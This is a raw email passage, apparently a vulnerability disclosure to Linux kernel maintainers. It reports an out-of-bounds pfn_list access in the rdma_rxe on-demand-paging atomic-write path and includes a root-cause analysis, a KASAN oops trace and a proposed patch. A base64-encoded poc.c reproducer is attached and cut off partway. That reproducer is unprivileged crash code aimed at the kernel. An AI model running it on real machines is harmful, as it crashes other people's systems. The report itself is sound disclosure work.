CONFIG_DEBUG_INFO=3Dy=0A=
CONFIG_DEBUG_INFO_DWARF5=3Dy=0A=
</code></div></pre>
<div class=3D"elementToProof" style=3D"font-family: Calibri, Helvetica, san=
s-serif; font-size: 12pt; color: rgb(0, 0, 0);">
<b>Root cause</b></div>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
<code>rxe_odp_mr_init_user()</code> accepts <code>start</code> and <code>io=
va</code> independently:</div>
<pre class=3D"elementToProof"><div class=3D"elementToProof" style=3D"white-=
space: pre; font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; c=
olor: rgb(0, 0, 0);"><code>umem_odp =3D ib_umem_odp_get(&amp;rxe-&gt;ib_dev=
, start, length, access_flags,=0A=
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbs=
p; &nbsp; &nbsp; &amp;rxe_mn_ops);=0A=
=0A=
...=0A=
=0A=
mr-&gt;ibmr.length =3D length;=0A=
mr-&gt;ibmr.iova =3D iova;=0A=
</code></div></pre>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
The ODP page list is sized according to the UMEM user address range, while =
RXE calculates the page-list index from the MR IOVA:</div>
<pre class=3D"elementToProof"><div class=3D"elementToProof" style=3D"white-=
space: pre; font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; c=
olor: rgb(0, 0, 0);"><code>idx =3D (iova - ib_umem_start(umem_odp)) &gt;&gt=
; umem_odp-&gt;page_shift;=0A=
</code></div></pre>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
There is no validation that the resulting index is within <code>umem_odp-&g=
t;map.pfn_list</code>.</div>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
<code>mr_check_range()</code> does not prevent this because it validates th=
e IOVA against
<code>mr-&gt;ibmr.iova</code> and <code>mr-&gt;ibmr.length</code>, rather t=
han against the underlying UMEM user address range.</div>
<div class=3D"elementToProof" style=3D"font-family: Calibri, Helvetica, san=
s-serif; font-size: 12pt; color: rgb(0, 0, 0);">
<b>Reproduction</b></div>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
A minimal reproducer is attached as <code>poc.c</code>.</div>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
The reproducer creates a one-page ODP MR with a deliberately divergent IOVA=
:</div>
<pre class=3D"elementToProof"><div class=3D"elementToProof" style=3D"white-=
space: pre; font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; c=
olor: rgb(0, 0, 0);"><code>user VA &nbsp; &nbsp; &nbsp;: 0x55b0f4fb2000=0A=
ODP IOVA &nbsp; &nbsp; : 0x55b1f4fb2000=0A=
IOVA delta &nbsp; : 0x100000000=0A=
ODP length &nbsp; : 0x1000=0A=
expected idx : 0x100000=0A=
</code></div></pre>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
The resulting index is <code>0x100000</code>, while the one-page ODP <code>=
pfn_list</code> only contains the entry corresponding to the valid UMEM pag=
e.</div>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
The reproducer then submits an RC atomic-write operation using the MR rkey =
and the divergent IOVA, reaching:</div>
<pre class=3D"elementToProof"><div class=3D"elementToProof" style=3D"white-=
space: pre; font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; c=
olor: rgb(0, 0, 0);"><code>rxe_odp_do_atomic_write()=0A=
 &nbsp;-&gt; rxe_odp_iova_to_index()=0A=
 &nbsp;-&gt; umem_odp-&gt;map.pfn_list[index]=0A=
 &nbsp;-&gt; hmm_pfn_to_page()=0A=
 &nbsp;-&gt; kmap_local_page()=0A=
 &nbsp;-&gt; smp_store_release()=0A=
</code></div></pre>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
The reproducer can be executed by an unprivileged user.</div>
<div class=3D"elementToProof" style=3D"font-family: Calibri, Helvetica, san=
s-serif; font-size: 12pt; color: rgb(0, 0, 0);">
<b>KASAN/Oops</b></div>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
The reproducer triggers:</div>
<pre class=3D"elementToProof"><div class=3D"elementToProof" style=3D"white-=
space: pre; font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; c=
olor: rgb(0, 0, 0);"><code>Oops: general protection fault, probably for non=
-canonical address ...=0A=
KASAN: maybe wild-memory-access ...=0A=
CPU: 3 UID: 0 PID: 13495 Comm: kworker/u514:1=0A=
Workqueue: rxe_wq do_work [rdma_rxe]=0A=
RIP: 0010:rxe_odp_do_atomic_write+0x1ba/0x3e0 [rdma_rxe]=0A=
</code></div></pre>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
Using <code>faddr2line</code>:</div>
<pre class=3D"elementToProof"><div class=3D"elementToProof" style=3D"white-=
space: pre; font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; c=
olor: rgb(0, 0, 0);"><code>rxe_odp_do_atomic_write+0x1ba/0x3e0:=0A=
rxe_odp_do_atomic_write at=0A=
/home/kali/linux-7.2.8/drivers/infiniband/sw/rxe/rxe_odp.c:410=0A=
</code></div></pre>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
Line 410 is:</div>
<pre class=3D"elementToProof"><div class=3D"elementToProof" style=3D"white-=
space: pre; font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; c=
olor: rgb(0, 0, 0);"><code>smp_store_release(&amp;va[page_offset &gt;&gt; 3=
], value);=0A=
</code></div></pre>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
The atomic value supplied by the reproducer was:</div>
<pre class=3D"elementToProof"><div class=3D"elementToProof" style=3D"white-=
space: pre; font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; c=
olor: rgb(0, 0, 0);"><code>atomic value=3D0x4141414142424242=0A=
</code></div></pre>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
The same value was present in the kernel register state at the time of the =
fault.</div>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
This demonstrates an out-of-bounds ODP <code>pfn_list</code> access in the =
RXE atomic-write path. I have not assumed arbitrary kernel write or code ex=
ecution from this crash; the demonstrated impact is a kernel memory-safety =
violation leading to a kernel fault.</div>
<div class=3D"elementToProof" style=3D"font-family: Calibri, Helvetica, san=
s-serif; font-size: 12pt; color: rgb(0, 0, 0);">
<b>Proposed fix</b></div>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
The existing ODP index calculation assumes that the MR IOVA and the UMEM us=
er address refer to the same address range. The simplest fix is to reject a=
n ODP MR when these addresses differ:</div>
<pre class=3D"elementToProof"><div class=3D"elementToProof" style=3D"white-=
space: pre; font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; c=
olor: rgb(0, 0, 0);"><code>diff --git a/drivers/infiniband/sw/rxe/rxe_odp.c=
 b/drivers/infiniband/sw/rxe/rxe_odp.c=0A=
index ...=0A=
--- a/drivers/infiniband/sw/rxe/rxe_odp.c=0A=
+++ b/drivers/infiniband/sw/rxe/rxe_odp.c=0A=
@@ -98,6 +98,9 @@ int rxe_odp_mr_init_user(struct rxe_dev *rxe, u64 start, =
u64 length,=0A=
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* Never reach here=
, for implicit ODP is not implemented. */</code><span style=3D"font-weight:=
 430;">rxe_odp_do_atomic_op()</span><code>=0A=
 &nbsp; &nbsp; &nbsp; &nbsp;}=0A=
=0A=
+ &nbsp; &nbsp; &nbsp; if (iova !=3D start)=0A=
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -EINVAL;=0A=
+=0A=
 &nbsp; &nbsp; &nbsp; &nbsp;umem_odp =3D ib_umem_odp_get(&amp;rxe-&gt;ib_de=
v, start, length, access_flags,=0A=
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbs=
p; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &amp;rxe_mn_ops);=0A=
</code></div></pre>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
This restores the invariant required by the existing ODP index calculation =
and prevents a divergent IOVA from producing an out-of-range
<code>pfn_list</code> index.</div>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
Please consider applying an appropriate fix to current mainline and stable =
kernels as appropriate.</div>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
The reproducer is attached as <code>poc.c</code>, and the relevant KASAN/Oo=
ps output is attached as
<code>kasan-oops.txt</code>.</div>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
Thanks,<br>
hellomessi</div>
<div style=3D"font-family: Calibri, Helvetica, sans-serif; font-size: 12pt;=
 color: rgb(0, 0, 0);">
<br>
</div>
</body>
</html>

--_000_SY7P300MB0292E9E08F0890A2C31CFD96DE972SY7P300MB0292AUSP_--

--_005_SY7P300MB0292E9E08F0890A2C31CFD96DE972SY7P300MB0292AUSP_
Content-Type: text/plain; name="poc.c"
Content-Description: poc.c
Content-Disposition: attachment; filename="poc.c"; size=8308;
	creation-date="Sun, 04 Oct 2026 13:54:43 GMT";
	modification-date="Sun, 04 Oct 2026 14:04:03 GMT"
Content-Transfer-Encoding: base64

I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8aW5maW5pYmFuZC92ZXJicy5oPgojaW5jbHVk
ZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN0ZGludC5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNs
dWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPGVycm5vLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2lu
Y2x1ZGUgPGludHR5cGVzLmg+CiNpbmNsdWRlIDxhcnBhL2luZXQuaD4KCiNkZWZpbmUgREVWX05B
TUUgInJ4ZTAiCiNkZWZpbmUgUE9SVF9OVU0gMQojZGVmaW5lIEdJRF9JTkRFWCAxCiNkZWZpbmUg
TVJfTEVOIDB4MTAwMFVMTAojZGVmaW5lIElPVkFfREVMVEEgMHgxMDAwMDAwMDBVTEwKI2RlZmlu
ZSBURVNUX1ZBTFVFIDB4NDE0MTQxNDE0MjQyNDI0MlVMTAoKc3RhdGljIHZvaWQgZGllKGNvbnN0
IGNoYXIgKnMpCnsKICAgIHBlcnJvcihzKTsKICAgIGV4aXQoRVhJVF9GQUlMVVJFKTsKfQoKc3Rh
dGljIHN0cnVjdCBpYnZfZGV2aWNlICpmaW5kX2RldmljZShjb25zdCBjaGFyICpuYW1lKQp7CiAg
ICBpbnQgbmRldiA9IDA7CiAgICBzdHJ1Y3QgaWJ2X2RldmljZSAqKmxpc3QgPSBpYnZfZ2V0X2Rl
dmljZV9saXN0KCZuZGV2KTsKCiAgICBpZiAoIWxpc3QpCiAgICAgICAgZGllKCJpYnZfZ2V0X2Rl
dmljZV9saXN0Iik7CgogICAgZm9yIChpbnQgaSA9IDA7IGkgPCBuZGV2OyBpKyspIHsKICAgICAg
ICBpZiAoIXN0cmNtcChpYnZfZ2V0X2RldmljZV9uYW1lKGxpc3RbaV0pLCBuYW1lKSkgewogICAg
ICAgICAgICBzdHJ1Y3QgaWJ2X2RldmljZSAqZGV2ID0gbGlzdFtpXTsKICAgICAgICAgICAgaWJ2
X2ZyZWVfZGV2aWNlX2xpc3QobGlzdCk7CiAgICAgICAgICAgIHJldHVybiBkZXY7CiAgICAgICAg
fQogICAgfQoKICAgIGlidl9mcmVlX2RldmljZV9saXN0KGxpc3QpOwogICAgZnByaW50ZihzdGRl
cnIsICJkZXZpY2UgJXMgbm90IGZvdW5kXG4iLCBuYW1lKTsKICAgIGV4aXQoRVhJVF9GQUlMVVJF
KTsKfQoKc3RhdGljIGludCBtb2RpZnlfcXBfaW5pdChzdHJ1Y3QgaWJ2X3FwICpxcCkKewogICAg
c3RydWN0IGlidl9xcF9hdHRyIGF0dHI7CgogICAgbWVtc2V0KCZhdHRyLCAwLCBzaXplb2YoYXR0
cikpOwogICAgYXR0ci5xcF9zdGF0ZSA9IElCVl9RUFNfSU5JVDsKICAgIGF0dHIucGtleV9pbmRl
eCA9IDA7CiAgICBhdHRyLnBvcnRfbnVtID0gUE9SVF9OVU07CiAgICBhdHRyLnFwX2FjY2Vzc19m
bGFncyA9CiAgICAgICAgSUJWX0FDQ0VTU19SRU1PVEVfUkVBRCB8CiAgICAgICAgSUJWX0FDQ0VT
U19SRU1PVEVfV1JJVEUgfAogICAgICAgIElCVl9BQ0NFU1NfUkVNT1RFX0FUT01JQzsKCiAgICBy
ZXR1cm4gaWJ2X21vZGlmeV9xcChxcCwgJmF0dHIsCiAgICAgICAgICAgICAgICAgICAgICAgICBJ
QlZfUVBfU1RBVEUgfAogICAgICAgICAgICAgICAgICAgICAgICAgSUJWX1FQX1BLRVlfSU5ERVgg
fAogICAgICAgICAgICAgICAgICAgICAgICAgSUJWX1FQX1BPUlQgfAogICAgICAgICAgICAgICAg
ICAgICAgICAgSUJWX1FQX0FDQ0VTU19GTEFHUyk7Cn0KCnN0YXRpYyBpbnQgbW9kaWZ5X3FwX3J0
cihzdHJ1Y3QgaWJ2X3FwICpxcCwKICAgICAgICAgICAgICAgICAgICAgICAgIHVpbnQzMl90IHJl
bW90ZV9xcG4sCiAgICAgICAgICAgICAgICAgICAgICAgICB1aW50MzJfdCByZW1vdGVfcHNuLAog
ICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgdW5pb24gaWJ2X2dpZCAqZ2lkKQp7CiAgICBz
dHJ1Y3QgaWJ2X3FwX2F0dHIgYXR0cjsKCiAgICBtZW1zZXQoJmF0dHIsIDAsIHNpemVvZihhdHRy
KSk7CiAgICBhdHRyLnFwX3N0YXRlID0gSUJWX1FQU19SVFI7CiAgICBhdHRyLnBhdGhfbXR1ID0g
SUJWX01UVV8xMDI0OwogICAgYXR0ci5kZXN0X3FwX251bSA9IHJlbW90ZV9xcG47CiAgICBhdHRy
LnJxX3BzbiA9IHJlbW90ZV9wc247CiAgICBhdHRyLm1heF9kZXN0X3JkX2F0b21pYyA9IDE7CiAg
ICBhdHRyLm1pbl9ybnJfdGltZXIgPSAxMjsKCiAgICBhdHRyLmFoX2F0dHIuaXNfZ2xvYmFsID0g
MTsKICAgIGF0dHIuYWhfYXR0ci5wb3J0X251bSA9IFBPUlRfTlVNOwogICAgYXR0ci5haF9hdHRy
LmdyaC5kZ2lkID0gKmdpZDsKICAgIGF0dHIuYWhfYXR0ci5ncmguc2dpZF9pbmRleCA9IEdJRF9J
TkRFWDsKICAgIGF0dHIuYWhfYXR0ci5ncmguaG9wX2xpbWl0ID0gMTsKCiAgICByZXR1cm4gaWJ2
X21vZGlmeV9xcChxcCwgJmF0dHIsCiAgICAgICAgICAgICAgICAgICAgICAgICBJQlZfUVBfU1RB
VEUgfAogICAgICAgICAgICAgICAgICAgICAgICAgSUJWX1FQX0FWIHwKICAgICAgICAgICAgICAg
ICAgICAgICAgIElCVl9RUF9QQVRIX01UVSB8CiAgICAgICAgICAgICAgICAgICAgICAgICBJQlZf
UVBfREVTVF9RUE4gfAogICAgICAgICAgICAgICAgICAgICAgICAgSUJWX1FQX1JRX1BTTiB8CiAg
ICAgICAgICAgICAgICAgICAgICAgICBJQlZfUVBfTUFYX0RFU1RfUkRfQVRPTUlDIHwKICAgICAg
ICAgICAgICAgICAgICAgICAgIElCVl9RUF9NSU5fUk5SX1RJTUVSKTsKfQoKc3RhdGljIGludCBt
b2RpZnlfcXBfcnRzKHN0cnVjdCBpYnZfcXAgKnFwLCB1aW50MzJfdCBwc24pCnsKICAgIHN0cnVj
dCBpYnZfcXBfYXR0ciBhdHRyOwoKICAgIG1lbXNldCgmYXR0ciwgMCwgc2l6ZW9mKGF0dHIpKTsK
ICAgIGF0dHIucXBfc3RhdGUgPSBJQlZfUVBTX1JUUzsKICAgIGF0dHIuc3FfcHNuID0gcHNuOwog
ICAgYXR0ci50aW1lb3V0ID0gMTQ7CiAgICBhdHRyLnJldHJ5X2NudCA9IDc7CiAgICBhdHRyLnJu
cl9yZXRyeSA9IDc7CiAgICBhdHRyLm1heF9yZF9hdG9taWMgPSAxOwoKICAgIHJldHVybiBpYnZf
bW9kaWZ5X3FwKHFwLCAmYXR0ciwKICAgICAgICAgICAgICAgICAgICAgICAgIElCVl9RUF9TVEFU
RSB8CiAgICAgICAgICAgICAgICAgICAgICAgICBJQlZfUVBfU1FfUFNOIHwKICAgICAgICAgICAg
ICAgICAgICAgICAgIElCVl9RUF9USU1FT1VUIHwKICAgICAgICAgICAgICAgICAgICAgICAgIElC
Vl9RUF9SRVRSWV9DTlQgfAogICAgICAgICAgICAgICAgICAgICAgICAgSUJWX1FQX1JOUl9SRVRS
WSB8CiAgICAgICAgICAgICAgICAgICAgICAgICBJQlZfUVBfTUFYX1FQX1JEX0FUT01JQyk7Cn0K
CnN0YXRpYyBpbnQgcG9sbF9jcV90aW1lb3V0KHN0cnVjdCBpYnZfY3EgKmNxLCBpbnQgdGltZW91
dF9tcykKewogICAgc3RydWN0IGlidl93YyB3YzsKCiAgICBmb3IgKGludCBpID0gMDsgaSA8IHRp
bWVvdXRfbXM7IGkrKykgewogICAgICAgIGludCBuID0gaWJ2X3BvbGxfY3EoY3EsIDEsICZ3Yyk7
CgogICAgICAgIGlmIChuIDwgMCkgewogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImlidl9w
b2xsX2NxIGZhaWxlZFxuIik7CiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICB9CgogICAg
ICAgIGlmIChuID09IDEpIHsKICAgICAgICAgICAgcHJpbnRmKCJjb21wbGV0aW9uOiB3cl9pZD0l
IiBQUkl1NjQKICAgICAgICAgICAgICAgICAgICIgc3RhdHVzPSVzICglZCkiCiAgICAgICAgICAg
ICAgICAgICAiIG9wY29kZT0lZCIKICAgICAgICAgICAgICAgICAgICIgdmVuZG9yX2Vycj0weCV4
XG4iLAogICAgICAgICAgICAgICAgICAgd2Mud3JfaWQsCiAgICAgICAgICAgICAgICAgICBpYnZf
d2Nfc3RhdHVzX3N0cih3Yy5zdGF0dXMpLAogICAgICAgICAgICAgICAgICAgd2Muc3RhdHVzLAog
ICAgICAgICAgICAgICAgICAgd2Mub3Bjb2RlLAogICAgICAgICAgICAgICAgICAgd2MudmVuZG9y
X2Vycik7CiAgICAgICAgICAgIHJldHVybiB3Yy5zdGF0dXMgPT0gSUJWX1dDX1NVQ0NFU1MgPyAw
IDogLTE7CiAgICAgICAgfQoKICAgICAgICB1c2xlZXAoMTAwMCk7CiAgICB9CgogICAgcHJpbnRm
KCJDUSB0aW1lb3V0IGFmdGVyICVkIG1zXG4iLCB0aW1lb3V0X21zKTsKICAgIHJldHVybiAtMTsK
fQoKaW50IG1haW4odm9pZCkKewogICAgc3RydWN0IGlidl9kZXZpY2UgKmRldjsKICAgIHN0cnVj
dCBpYnZfY29udGV4dCAqY3R4ID0gTlVMTDsKICAgIHN0cnVjdCBpYnZfcGQgKnBkID0gTlVMTDsK
ICAgIHN0cnVjdCBpYnZfY3EgKmNxMCA9IE5VTEw7CiAgICBzdHJ1Y3QgaWJ2X2NxICpjcTEgPSBO
VUxMOwogICAgc3RydWN0IGlidl9xcCAqcXAwID0gTlVMTDsKICAgIHN0cnVjdCBpYnZfcXAgKnFw
MSA9IE5VTEw7CiAgICBzdHJ1Y3QgaWJ2X21yICptciA9IE5VTEw7CiAgICBzdHJ1Y3QgaWJ2X3Fw
X2luaXRfYXR0cl9leCBxcGE7CiAgICBzdHJ1Y3QgaWJ2X3FwX2V4ICpxcHggPSBOVUxMOwogICAg
dW5pb24gaWJ2X2dpZCBnaWQ7CiAgICB2b2lkICpidWYgPSBOVUxMOwogICAgdWludDMyX3QgcHNu
MCA9IDB4MTIzNDU7CiAgICB1aW50MzJfdCBwc24xID0gMHgyMzQ1NjsKICAgIHVpbnQ2NF90IHVz
ZXJfdmE7CiAgICB1aW50NjRfdCBpb3ZhOwogICAgdWludDY0X3QgdmFsdWUgPSBURVNUX1ZBTFVF
OwogICAgaW50IHJldDsKCiAgICBkZXYgPSBmaW5kX2RldmljZShERVZfTkFNRSk7CgogICAgY3R4
ID0gaWJ2X29wZW5fZGV2aWNlKGRldik7CiAgICBpZiAoIWN0eCkKICAgICAgICBkaWUoImlidl9v
cGVuX2RldmljZSIpOwoKICAgIGlmIChpYnZfcXVlcnlfZ2lkKGN0eCwgUE9SVF9OVU0sIEdJRF9J
TkRFWCwgJmdpZCkpCiAgICAgICAgZGllKCJpYnZfcXVlcnlfZ2lkIik7CgogICAgY2hhciBnaWRf
c3RyW0lORVQ2X0FERFJTVFJMRU4gKyAzMl07CiAgICBpZiAoIWluZXRfbnRvcChBRl9JTkVUNiwg
Z2lkLnJhdywgZ2lkX3N0ciwgc2l6ZW9mKGdpZF9zdHIpKSkKICAgICAgICBzdHJjcHkoZ2lkX3N0
ciwgIj8iKTsKCiAgICBwcmludGYoImRldmljZTogJXNcbiIsIGlidl9nZXRfZGV2aWNlX25hbWUo
ZGV2KSk7CiAgICBwcmludGYoIkdJRFslZF06ICVzXG4iLCBHSURfSU5ERVgsIGdpZF9zdHIpOwoK
ICAgIHBkID0gaWJ2X2FsbG9jX3BkKGN0eCk7CiAgICBpZiAoIXBkKQogICAgICAgIGRpZSgiaWJ2
X2FsbG9jX3BkIik7CgogICAgY3EwID0gaWJ2X2NyZWF0ZV9jcShjdHgsIDE2LCBOVUxMLCBOVUxM
LCAwKTsKICAgIGlmICghY3EwKQogICAgICAgIGRpZSgiaWJ2X2NyZWF0ZV9jcSIpOwoKICAgIGNx
MSA9IGlidl9jcmVhdGVfY3EoY3R4LCAxNiwgTlVMTCwgTlVMTCwgMCk7CiAgICBpZiAoIWNxMSkK
ICAgICAgICBkaWUoImlidl9jcmVhdGVfY3EiKTsKCiAgICBtZW1zZXQoJnFwYSwgMCwgc2l6ZW9m
KHFwYSkpOwogICAgcXBhLmNvbXBfbWFzayA9CiAgICAgICAgSUJWX1FQX0lOSVRfQVRUUl9QRCB8
CiAgICAgICAgSUJWX1FQX0lOSVRfQVRUUl9TRU5EX09QU19GTEFHUzsKICAgIHFwYS5wZCA9IHBk
OwogICAgcXBhLnNlbmRfY3EgPSBjcTA7CiAgICBxcGEucmVjdl9jcSA9IGNxMDsKICAgIHFwYS5x
cF90eXBlID0gSUJWX1FQVF9SQzsKICAgIHFwYS5jYXAubWF4X3NlbmRfd3IgPSAxNjsKICAgIHFw
YS5jYXAubWF4X3JlY3Zfd3IgPSAxNjsKICAgIHFwYS5jYXAubWF4X3NlbmRfc2dlID0gMTsKICAg
IHFwYS5jYXAubWF4X3JlY3Zfc2dlID0gMTsKICAgIHFwYS5zZW5kX29wc19mbGFncyA9CiAgICAg
ICAgSUJWX1FQX0VYX1dJVEhfQVRPTUlDX1dSSVRFOwoKICAgIHFwMCA9IGlidl9jcmVhdGVfcXBf
ZXgoY3R4LCAmcXBhKTsKICAgIGlmICghcXAwKQogICAgICAgIGRpZSgiaWJ2X2NyZWF0ZV9xcF9l
eCBxcDAiKTsKCiAgICBxcGEuc2VuZF9jcSA9IGNxMTsKICAgIHFwYS5yZWN2X2NxID0gY3ExOwoK
ICAgIHFwMSA9IGlidl9jcmVhdGVfcXBfZXgoY3R4LCAmcXBhKTsKICAgIGlmICghcXAxKQogICAg
ICAgIGRpZSgiaWJ2X2NyZWF0ZV9xcF9leCBxcDEiKTsKCiAgICByZXQgPSBtb2RpZnlfcXBfaW5p
dChxcDApOwogICAgaWYgKHJldCkKICAgICAgICBkaWUoIm1vZGlmeSBxcDAgSU5JVCIpOwoKICAg
IHJldCA9IG1vZGlmeV9xcF9pbml0KHFwMSk7CiAgICBpZiAocmV0KQogICAgICAgIGRpZSgibW9k
aWZ5IHFwMSBJTklUIik7CgogICAgcmV0ID0gbW9kaWZ5X3FwX3J0cihxcDAsIHFwMS0+cXBfbnVt
LCBwc24xLCAmZ2lkKTsKICAgIGlmIChyZXQpCiAgICAgICAgZGllKCJtb2RpZnkgcXAwIFJUUiIp
OwoKICAgIHJldCA9IG1vZGlmeV9xcF9ydHIocXAxLCBxcDAtPnFwX251bSwgcHNuMCwgJmdpZCk7
CiAgICBpZiAocmV0KQogICAgICAgIGRpZSgibW9kaWZ5IHFwMSBSVFIiKTsKCiAgICByZXQgPSBt
b2RpZnlfcXBfcnRzKHFwMCwgcHNuMCk7CiAgICBpZiAocmV0KQogICAgICAgIGRpZSgibW9kaWZ5
IHFwMCBSVFMiKTsKCiAgICByZXQgPSBtb2RpZnlfcXBfcnRzKHFwMSwgcHNuMSk7CiAgICBpZiAo
cmV0KQogICAgICAgIGRpZSgibW9kaWZ5IHFwMSBSVFMiKTsKCiAgICByZXQgPSBwb3NpeF9tZW1h
bGlnbigmYnVmLCA0MDk2LCBNUl9MRU4pOwogICAgaWYgKHJldCkgewogICAgICAgIGVycm5vID0g
cmV0OwogICAgICAgIGRpZSgicG9zaXhfbWVtYWxpZ24iKTsKICAgIH0KCiAgICBtZW1zZXQoYnVm
LCAweDQxLCBNUl9MRU4pOwoKICAgIHVzZXJfdmEgPSAodWludDY0X3QpKHVpbnRwdHJfdClidWY7
CiAgICBpb3ZhID0gdXNlcl92YSArIElPVkFfREVMVEE7CgogICAgbXIgPSBpYnZfcmVnX21yX2lv
dmEyKAogICAgICAgIHBkLAogICAgICAgIGJ1ZiwKICAgICAgICBNUl9MRU4sCiAgICAgICAgaW92
YSwKICAgICAgICBJQlZfQUNDRVNTX0xPQ0FMX1dSSVRFIHwKICAgICAgICBJQlZfQUNDRVNTX1JF
TU9URV9SRUFEIHwKICAgICAgICBJQlZfQUNDRVNTX1JFTU9URV9XUklURSB8CiAgICAgICAgSUJW
X0FDQ0VTU19SRU1PVEVfQVRPTUlDIHwKICAgICAgICBJQlZfQUNDRVNTX09OX0RFTUFORCk7Cgog
ICAgaWYgKCFtcikKICAgICAgICBkaWUoImlidl9yZWdfbXJfaW92YTIiKTsKCiAgICBwcmludGYo
InVzZXIgVkEgICAgICA6IDB4JSIgUFJJeDY0ICJcbiIsIHVzZXJfdmEpOwogICAgcHJpbnRmKCJP
RFAgSU9WQSAgICAgOiAweCUiIFBSSXg2NCAiXG4iLCBpb3ZhKTsKICAgIHByaW50ZigiSU9WQSBk
ZWx0YSAgIDogMHglIiBQUkl4NjQgIlxuIiwKICAgICAgICAgICBpb3ZhIC0gdXNlcl92YSk7CiAg
ICBwcmludGYoIk9EUCBsa2V5ICAgICA6IDB4JXhcbiIsIG1yLT5sa2V5KTsKICAgIHByaW50Zigi
T0RQIHJrZXkgICAgIDogMHgleFxuIiwgbXItPnJrZXkpOwogICAgcHJpbnRmKCJPRFAgbGVuZ3Ro
ICAgOiAweCVsbHhcbiIsCiAgICAgICAgICAgKHVuc2lnbmVkIGxvbmcgbG9uZylNUl9MRU4pOwog
ICAgcHJpbnRmKCJleHBlY3RlZCBpZHggOiAweCUiIFBSSXg2NCAiXG4iLAogICAgICAgICAgIChp
b3ZhIC0gdXNlcl92YSkgPj4gMTIpOwoKICAgIGlmICgoKGlvdmEgLSB1c2VyX3ZhKSA+PiAxMikg
IT0gMHgxMDAwMDApIHsKICAgICAgICBmcHJpbnRmKHN0ZGVyciwgInVuZXhwZWN0ZWQgT0RQIGlu
ZGV4XG4iKTsKICAgICAgICByZXR1cm4gRVhJVF9GQUlMVVJFOwogICAgfQoKICAgIHFweCA9IGli
